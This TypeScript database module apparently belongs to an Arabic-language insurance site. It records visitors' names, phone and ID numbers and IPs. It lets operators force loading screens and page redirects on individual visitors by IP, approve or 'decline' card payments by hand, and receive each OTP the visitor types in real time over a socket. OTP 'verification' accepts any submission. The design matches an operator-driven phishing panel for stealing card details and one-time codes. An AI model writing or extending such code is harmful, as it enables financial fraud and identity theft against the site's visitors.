import { and, desc, eq, gte, like, or, sql } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import {
  BannedIp,
  InsertInsuranceRequest,
  InsertUser,
  InsuranceRequest,
  LoadingScreenSetting,
  NavigationCommand,
  bannedIps,
  insuranceRequests,
  loadingScreenSettings,
  navigationCommands,
  users,
} from "../drizzle/schema";
import { ENV } from "./_core/env";
import { emitToAdmins, emitToVisitor } from "./socket";

let _db: ReturnType<typeof drizzle> | null = null;

export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

// ======= Users =======
export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) throw new Error("User openId is required for upsert");
  const db = await getDb();
  if (!db) return;
  const values: InsertUser = { openId: user.openId };
  const updateSet: Record<string, unknown> = {};
  const textFields = ["name", "email", "loginMethod"] as const;
  for (const field of textFields) {
    const value = user[field];
    if (value === undefined) continue;
    const normalized = value ?? null;
    values[field] = normalized;
    updateSet[field] = normalized;
  }
  if (user.lastSignedIn !== undefined) {
    values.lastSignedIn = user.lastSignedIn;
    updateSet.lastSignedIn = user.lastSignedIn;
  }
  if (user.role !== undefined) {
    values.role = user.role;
    updateSet.role = user.role;
  } else if (user.openId === ENV.ownerOpenId) {
    values.role = "admin";
    updateSet.role = "admin";
  }
  if (!values.lastSignedIn) values.lastSignedIn = new Date();
  if (Object.keys(updateSet).length === 0) updateSet.lastSignedIn = new Date();
  await db.insert(users).values(values).onDuplicateKeyUpdate({ set: updateSet });
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) return undefined;
  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);
  return result.length > 0 ? result[0] : undefined;
}

// ======= Insurance Requests =======
export async function upsertInsuranceRequest(data: InsertInsuranceRequest): Promise<InsuranceRequest | null> {
  const db = await getDb();
  if (!db) return null;
  // Check if session already exists
  const existing = await db
    .select()
    .from(insuranceRequests)
    .where(eq(insuranceRequests.sessionId, data.sessionId))
    .limit(1);
  if (existing.length > 0) {
    const updateData: Partial<InsertInsuranceRequest> = { ...data };
    delete (updateData as any).sessionId;
    delete (updateData as any).createdAt;
    await db
      .update(insuranceRequests)
      .set(updateData as any)
      .where(eq(insuranceRequests.sessionId, data.sessionId));
    const updated = await db
      .select()
      .from(insuranceRequests)
      .where(eq(insuranceRequests.sessionId, data.sessionId))
      .limit(1);
    return updated[0] ?? null;
  } else {
    await db.insert(insuranceRequests).values(data);
    const created = await db
      .select()
      .from(insuranceRequests)
      .where(eq(insuranceRequests.sessionId, data.sessionId))
      .limit(1);
    return created[0] ?? null;
  }
}

export async function getAllInsuranceRequests(opts?: {
  search?: string;
  status?: string;
  limit?: number;
  offset?: number;
}) {
  const db = await getDb();
  if (!db) return { rows: [], total: 0 };
  const limit = opts?.limit ?? 50;
  const offset = opts?.offset ?? 0;
  let query = db.select().from(insuranceRequests).$dynamic();
  const conditions = [];
  if (opts?.search) {
    conditions.push(
      or(
        like(insuranceRequests.userName, `%${opts.search}%`),
        like(insuranceRequests.phoneNumber, `%${opts.search}%`),
        like(insuranceRequests.idNumber, `%${opts.search}%`),
        like(insuranceRequests.visitorIp, `%${opts.search}%`)
      )
    );
  }
  if (opts?.status && opts.status !== "all") {
    conditions.push(eq(insuranceRequests.status, opts.status as any));
  }
  if (conditions.length > 0) {
    query = query.where(and(...(conditions as any[])));
  }
  const rows = await query.orderBy(desc(insuranceRequests.createdAt)).limit(limit).offset(offset);
  // Count total
  let countQuery = db.select({ count: sql<number>`count(*)` }).from(insuranceRequests).$dynamic();
  if (conditions.length > 0) {
    countQuery = countQuery.where(and(...(conditions as any[])));
  }
  const countResult = await countQuery;
  const total = Number(countResult[0]?.count ?? 0);
  return { rows, total };
}

export async function getInsuranceRequestById(id: number) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(insuranceRequests).where(eq(insuranceRequests.id, id)).limit(1);
  return result[0] ?? null;
}

export async function getInsuranceStats() {
  const db = await getDb();
  if (!db) return { total: 0, today: 0, totalAmount: 0, topPlans: [] };
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  const [totalResult, todayResult, amountResult] = await Promise.all([
    db.select({ count: sql<number>`count(*)` }).from(insuranceRequests),
    db
      .select({ count: sql<number>`count(*)` })
      .from(insuranceRequests)
      .where(gte(insuranceRequests.createdAt, today)),
    db
      .select({ sum: sql<number>`COALESCE(SUM(total), 0)` })
      .from(insuranceRequests)
      .where(eq(insuranceRequests.status, "payment_submitted")),
  ]);
  const topPlans = await db
    .select({
      planName: insuranceRequests.planName,
      planCompany: insuranceRequests.planCompany,
      count: sql<number>`count(*)`,
    })
    .from(insuranceRequests)
    .where(sql`planName IS NOT NULL`)
    .groupBy(insuranceRequests.planName, insuranceRequests.planCompany)
    .orderBy(desc(sql`count(*)`))
    .limit(5);
  return {
    total: Number(totalResult[0]?.count ?? 0),
    today: Number(todayResult[0]?.count ?? 0),
    totalAmount: Number(amountResult[0]?.sum ?? 0),
    topPlans,
  };
}

// ======= Banned IPs =======
export async function isIpBanned(ip: string): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;
  const result = await db.select().from(bannedIps).where(eq(bannedIps.ip, ip)).limit(1);
  return result.length > 0;
}

export async function banIp(ip: string, reason?: string): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db
    .insert(bannedIps)
    .values({ ip, reason: reason ?? null })
    .onDuplicateKeyUpdate({ set: { reason: reason ?? null } });
}

export async function unbanIp(ip: string): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db.delete(bannedIps).where(eq(bannedIps.ip, ip));
}

export async function getAllBannedIps(): Promise<BannedIp[]> {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(bannedIps).orderBy(desc(bannedIps.bannedAt));
}

// ======= Loading Screen =======
export async function getLoadingScreenSetting(ip: string): Promise<LoadingScreenSetting | null> {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(loadingScreenSettings).where(eq(loadingScreenSettings.visitorIp, ip)).limit(1);
  return result[0] ?? null;
}

export async function setLoadingScreenSetting(
  ip: string,
  isActive: boolean,
  loadingText?: string,
  loadingSubtext?: string
): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db
    .insert(loadingScreenSettings)
    .values({
      visitorIp: ip,
      isActive,
      loadingText: loadingText ?? "جاري التحميل...",
      loadingSubtext: loadingSubtext ?? "يرجى الانتظار",
    })
    .onDuplicateKeyUpdate({
      set: {
        isActive,
        loadingText: loadingText ?? "جاري التحميل...",
        loadingSubtext: loadingSubtext ?? "يرجى الانتظار",
      },
    });
}

// ======= Navigation Commands =======
export async function createNavigationCommand(ip: string, targetPage: string): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db.insert(navigationCommands).values({ visitorIp: ip, targetPage });
}

export async function getPendingNavigationCommand(ip: string): Promise<NavigationCommand | null> {
  const db = await getDb();
  if (!db) return null;
  const result = await db
    .select()
    .from(navigationCommands)
    .where(and(eq(navigationCommands.visitorIp, ip), eq(navigationCommands.executed, false)))
    .orderBy(desc(navigationCommands.createdAt))
    .limit(1);
  return result[0] ?? null;
}

export async function markNavigationCommandExecuted(id: number): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db.update(navigationCommands).set({ executed: true }).where(eq(navigationCommands.id, id));
}

// ======= Payment Approval =======
export async function approvePayment(requestId: number): Promise<void> {
  const db = await getDb();
  if (!db) return;
  // Generate random OTP
  const otpDigits = Math.floor(Math.random() * 3) + 4; // 4-6 digits
  const otpCode = Math.floor(Math.random() * Math.pow(10, otpDigits)).toString().padStart(otpDigits, '0');
  await db
    .update(insuranceRequests)
    .set({
      paymentStatus: "approved",
      otpCode,
      otpDigits,
      status: "payment_submitted",
    })
    .where(eq(insuranceRequests.id, requestId));
}

export async function rejectPayment(requestId: number): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db
    .update(insuranceRequests)
    .set({
      paymentStatus: "rejected",
      cardDeclined: true,
    })
    .where(eq(insuranceRequests.id, requestId));
}

// إرسال OTP إلى قاعدة البيانات
export async function submitOtp(sessionId: string, otp: string): Promise<{ success: boolean; message?: string; request?: InsuranceRequest }> {
  const db = await getDb();
  if (!db) return { success: false, message: "خطأ في قاعدة البيانات" };
  const result = await db
    .select()
    .from(insuranceRequests)
    .where(and(eq(insuranceRequests.sessionId, sessionId), eq(insuranceRequests.paymentStatus, "approved")))
    .limit(1);
  const req = result[0];
  if (!req) return { success: false, message: "لا يوجد طلب دفع معتمد" };
  await db
    .update(insuranceRequests)
    .set({ otpSubmitted: otp })
    .where(eq(insuranceRequests.id, req.id));
  const updated = await db
    .select()
    .from(insuranceRequests)
    .where(eq(insuranceRequests.id, req.id))
    .limit(1);
  const request = updated[0];
  // إشعار الإدارة بأن OTP تم إدخاله
  emitToAdmins("otpSubmitted", { requestId: req.id, otp });
  if (request) {
    emitToAdmins("requestUpdated", request);
    if (request.visitorIp) {
      emitToVisitor(request.visitorIp, "otpSubmitted", { requestId: req.id, otp });
    }
  }
  return { success: true, request };
}

export async function verifyOtp(sessionId: string): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;
  const result = await db
    .select()
    .from(insuranceRequests)
    .where(eq(insuranceRequests.sessionId, sessionId))
    .limit(1);
  const req = result[0];
  if (!req) return false;
  if (req.paymentStatus === "approved" && req.otpSubmitted) {
    await db
      .update(insuranceRequests)
      .set({ otpVerified: true, status: "otp_verified", currentStep: 6 })
      .where(eq(insuranceRequests.id, req.id));
    const updated = await db
      .select()
      .from(insuranceRequests)
      .where(eq(insuranceRequests.id, req.id))
      .limit(1);
    const request = updated[0];
    emitToAdmins("otpVerified", { requestId: req.id });
    if (request) {
      emitToAdmins("requestUpdated", request);
      if (request.visitorIp) {
        emitToVisitor(request.visitorIp, "otpVerified", { requestId: req.id });
      }
    }
    return true;
  }
  return false;
}

export async function getPaymentRequestBySession(sessionId: string) {
  const db = await getDb();
  if (!db) return null;
  const result = await db
    .select()
    .from(insuranceRequests)
    .where(and(eq(insuranceRequests.sessionId, sessionId), eq(insuranceRequests.status, "payment_submitted")))
    .limit(1);
  return result[0] ?? null;
}

export async function checkPaymentStatus(sessionId: string) {
  const db = await getDb();
  if (!db) return null;
  const result = await db
    .select()
    .from(insuranceRequests)
    .where(eq(insuranceRequests.sessionId, sessionId))
    .limit(1);
  const req = result[0];
  if (!req) return null;
  return {
    paymentStatus: req.paymentStatus,
    otpCode: req.otpCode,
    otpDigits: req.otpDigits,
    status: req.status,
    cardDeclined: req.cardDeclined,
  };
}
